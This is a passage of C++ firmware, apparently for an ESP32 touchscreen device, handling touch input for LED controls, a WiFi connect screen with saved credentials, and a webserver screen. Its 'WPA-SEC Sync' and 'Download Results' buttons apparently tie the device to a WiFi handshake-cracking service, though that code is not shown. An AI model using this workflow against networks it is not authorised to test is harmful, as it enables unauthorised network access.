      TouchState s = readTouch();
      if (!s.down) break;

      bool stepChanged = false;
      if (ledSliderDraggingHue) {
        stepChanged = ledSetHueFromTouchX(s.x);
      } else if (ledSliderDraggingBrightness) {
        stepChanged = ledSetBrightnessFromTouchX(s.x);
      }

      if (stepChanged) {
        applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
        drawLedControlDynamic();
      }
      delay(8);
    }

    ledSliderDraggingHue = false;
    ledSliderDraggingBrightness = false;
    waitTouchRelease();
    return;
  }

  // WIFI_CONNECT
  if (screen == ScreenId::WIFI_CONNECT) {
    if (wifiConnectShowPasswordModal) {
      // Keep bottom nav Back responsive even while modal is open.
      if (hit(btnWifiConnectBack, tx, ty)) {
        wifiConnectShowSavedDrawer = false;
        wifiConnectShowPasswordModal = false;
        Serial.println("[ui] Returning to WIFI_SCAN from WIFI_CONNECT (modal)");
        setScreen(ScreenId::WIFI_SCAN);
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiSavedClose, tx, ty)) {
        wifiConnectShowSavedDrawer = false;
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      for (int i = 0; i < AppConfig::MAX_SAVED_WIFI; i++) {
        if (hit(btnWifiSavedRows[i], tx, ty) && i < cfg.wifi_savedCount) {
          wifiConnectShowSavedDrawer = false;
          wifiConnectPassword = cfg.wifi_savedPassword[i];
          const String savedSsid = cfg.wifi_savedSsid[i];
          for (int a = 0; a < apCount; a++) {
            if (aps[a].ssid == savedSsid) {
              wifiConnectSelectedIdx = a;
              break;
            }
          }
          wifiConnectStatus = "Loaded saved credentials";
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
      }
      for (int i = 0; i < wifiPwKeyCount; i++) {
        if (hit(btnWifiPwKeys[i], tx, ty)) {
          if (wifiConnectPassword.length() < 63) {
            wifiConnectPassword += wifiPwKeyValues[i];
          }
          if (wifiPwShift && !wifiPwSymbols) wifiPwShift = false;
          drawWifiPasswordModal();
          waitTouchRelease();
          return;
        }
      }
      if (hit(btnWifiPwShift, tx, ty)) {
        if (wifiPwSymbols) {
          wifiPwSymbols = false;
          wifiPwShift = false;
        } else {
          wifiPwShift = !wifiPwShift;
        }
        drawWifiPasswordModal();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwMode, tx, ty)) {
        wifiPwSymbols = !wifiPwSymbols;
        wifiPwShift = false;
        drawWifiPasswordModal();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwShowHide, tx, ty)) {
        wifiConnectRevealPassword = !wifiConnectRevealPassword;
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwBack, tx, ty)) {
        if (!wifiConnectPassword.isEmpty()) wifiConnectPassword.remove(wifiConnectPassword.length() - 1);
        drawWifiPasswordModal();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwClear, tx, ty)) {
        wifiConnectPassword = "";
        drawWifiPasswordModal();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwSaved, tx, ty)) {
        wifiConnectShowSavedDrawer = !wifiConnectShowSavedDrawer;
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwSpace, tx, ty)) {
        if (wifiConnectPassword.length() < 63) wifiConnectPassword += " ";
        drawWifiPasswordModal();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwCancel, tx, ty)) {
        wifiConnectPassword = "";
        wifiConnectShowSavedDrawer = false;
        wifiConnectStatus = "Canceled";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwConnect, tx, ty)) {
        if (wifiConnectSelectedIdx < 0 || wifiConnectSelectedIdx >= apCount) {
          wifiConnectShowPasswordModal = false;
          wifiConnectStatus = "Select a network first";
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
        if (wifiConnectPassword.isEmpty()) {
          wifiConnectStatus = "Password cannot be empty";
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
        const ApRecord& selectedAp = aps[wifiConnectSelectedIdx];
        connectToWifi(selectedAp.ssid, wifiConnectPassword);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwReconnect, tx, ty)) {
        if (!cfg.wifi_ssid.isEmpty()) {
          wifiConnectPassword = cfg.wifi_password;
          connectToWifi(cfg.wifi_ssid, cfg.wifi_password);
          wifiConnectStatus = "Reconnecting to saved network";
        } else if (cfg.wifi_savedCount > 0) {
          connectToWifi(cfg.wifi_savedSsid[0], cfg.wifi_savedPassword[0]);
          wifiConnectStatus = "Reconnecting saved[0]";
        } else {
          wifiConnectStatus = "No saved network";
        }
        drawWifiConnect();
        waitTouchRelease();
        return;
      }

      waitTouchRelease();
      return;
    }

    // Back button
    if (hit(btnWifiConnectBack, tx, ty)) {
      Serial.println("[ui] Returning to WIFI_SCAN from WIFI_CONNECT");
      setScreen(ScreenId::WIFI_SCAN);
      waitTouchRelease();
      return;
    }

    // Scan button
    if (hit(btnWifiConnectScan, tx, ty)) {
      Serial.println("[wifi] User initiated WiFi scan from WIFI_CONNECT screen");
      wifiConnectStatus = "Scanning networks...";
      wifiConnectSelectedIdx = -1;
      wifiConnectScroll = 0;
      wifiConnectScanActive = startWifiScanAsync();
      wifiConnectScanStartedMs = millis();
      if (!wifiConnectScanActive) {
        wifiConnectStatus = "Scan start failed";
      }
      drawWifiConnect();
      waitTouchRelease();
      return;
    }

    // Connect button
    if (hit(btnWifiConnectSubmit, tx, ty)) {
      if (wifiConnectScanActive) {
        wifiConnectStatus = "Wait for scan to finish";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (wifiConnectSelectedIdx >= 0) {
        const ApRecord& selectedAp = aps[wifiConnectSelectedIdx];
        // Open networks connect immediately.
        if (selectedAp.auth == WIFI_AUTH_OPEN) {
          Serial.println("[wifi] Open network detected, connecting without password");
          connectToWifi(selectedAp.ssid, "");
        } else {
          // Secured network: show password modal (prefill saved password if SSID matches).
          wifiConnectPassword = (cfg.wifi_ssid == selectedAp.ssid) ? cfg.wifi_password : "";
          wifiPwShift = false;
          wifiPwSymbols = false;
          wifiConnectShowPasswordModal = !ND_HW_KEYBOARD;
          wifiConnectStatus = ND_HW_KEYBOARD
                            ? "Type password then press Connect"
                            : "Enter password for: " + selectedAp.ssid;
          Serial.printf("[wifi] Password entry for '%s'\n", selectedAp.ssid.c_str());
        }
        drawWifiConnect();
      } else {
        wifiConnectStatus = "Select a network first";
        Serial.println("[wifi] Connect attempt: no network selected");
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // Disconnect button
    if (hit(btnWifiConnectDisconnect, tx, ty)) {
      wifiConnectInProgress = false;
      WiFi.disconnect(false, false);
      wifiConnectStatus = "Disconnected";
      Serial.println("[wifi] User disconnected from current network");
      drawWifiConnect();
      waitTouchRelease();
      return;
    }

    // Scroll up button
    if (hit(btnWifiConnectUp, tx, ty)) {
      if (wifiConnectScroll > 0) {
        wifiConnectScroll--;
        Serial.printf("[ui] WiFi list scrolled up to position %d\n", wifiConnectScroll);
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // Scroll down button
    if (hit(btnWifiConnectDown, tx, ty)) {
      if ((wifiConnectScroll + WIFI_CONNECT_VISIBLE_ROWS) < apCount) {
        wifiConnectScroll++;
        Serial.printf("[ui] WiFi list scrolled down to position %d\n", wifiConnectScroll);
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // AP list selection
    if (wifiConnectScanActive) {
      waitTouchRelease();
      return;
    }
    for (int i = 0; i < WIFI_CONNECT_VISIBLE_ROWS && (wifiConnectScroll + i) < apCount; i++) {
      if (hit(btnWifiConnectList[i], tx, ty)) {
        wifiConnectSelectedIdx = wifiConnectScroll + i;
        wifiConnectSsid = aps[wifiConnectSelectedIdx].ssid.isEmpty() ? "(hidden)" : aps[wifiConnectSelectedIdx].ssid;
        wifiConnectNeedsPassword = (aps[wifiConnectSelectedIdx].auth != WIFI_AUTH_OPEN);
        Serial.printf("[wifi] Selected: '%s' (Channel %d, Auth: %s, RSSI: %ddBm)\n", 
                      wifiConnectSsid.c_str(),
                      aps[wifiConnectSelectedIdx].channel,
                      authToStr(aps[wifiConnectSelectedIdx].auth),
                      aps[wifiConnectSelectedIdx].rssi);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
    }

    waitTouchRelease();
    return;
  }

  // WEBSERVER
  if (screen == ScreenId::WEBSERVER) {
    // Back button
    if (hit(btnWebserverBack, tx, ty)) {
      Serial.println("[ui] Returning to CONFIG from WEBSERVER");
      setScreen(ScreenId::CONFIG);
      waitTouchRelease();
      return;
    }

    // Start/Stop AP button
    if (hit(btnWebserverStartAP, tx, ty)) {
      startAPMode();
      Serial.printf("[ap] AP mode toggled: %s\n", apMode ? "ON" : "OFF");
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WebServer toggle button
    if (hit(btnWebserverStartServer, tx, ty)) {
      if (webServerRunning) stopWebServer();
      else startWebServer();
      Serial.printf("[web] WebServer state: %s\n", webServerRunning ? "ON" : "OFF");
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WPA-SEC Sync button
    if (hit(btnWebserverWpaSecSync, tx, ty)) {
      Serial.println("[ui] User pressed WPA-SEC Sync button");
      syncWithWPASec();
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WPA-SEC Download Results button
    if (hit(btnWebserverDownloadResults, tx, ty)) {
      Serial.println("[ui] User pressed Download Results button");
      downloadWPASecResults();
      drawWebserver();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }


}
